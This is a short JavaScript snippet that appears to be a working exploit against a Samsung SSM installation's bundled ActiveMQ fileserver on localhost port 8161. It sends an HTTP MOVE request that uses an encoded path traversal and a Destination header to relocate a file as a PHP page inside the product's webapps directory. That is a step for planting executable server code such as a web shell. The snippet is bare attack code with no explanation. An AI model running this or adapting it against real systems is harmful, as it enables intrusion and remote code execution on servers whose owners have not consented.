var url ="http://127.0.0.1:8161/fileserver/..%5C%5Cfavicon.ico";
var xhr=new XMLHttpRequest();
xhr.open("MOVE",url,true);
xhr.setRequestHeader("Destination","http://127.0.0.1:8161/C://Program Files//Samsung//SSM//SystemManager//mq//webapps//AAA.PHP");
xhr.send();
//DON'T RETURN TRUE IF NO FUNCTION
